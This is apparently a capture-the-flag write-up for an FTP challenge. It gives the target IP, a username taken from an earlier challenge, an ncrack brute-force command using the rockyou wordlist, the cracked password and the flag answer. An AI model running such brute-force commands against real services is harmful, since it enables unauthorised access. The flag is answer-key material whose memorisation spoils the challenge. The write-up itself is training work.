**Title:** Fake Text Protocol

**Category:** Networking

**Rank:** Legendary

**Hint:** You already know the username from Social Eng challenges

**Question:**
 
 Can you break into this Fake Text Protocol?

**How to solve it:**
1. connect to ftp
```
ftp 18.189.22.84
```
2. Login to ftp:
    -   `Username: Spenevank` 
    -   `Password: 12345` (second password on `rockyou.txt`)
```
ncrack -u Spenevank -P /usr/share/wordlists/rockyou.txt ftp://18.189.22.84 -v
```

**Answer:** 

flag{A_Piece_of_Cake_4ks2kd}
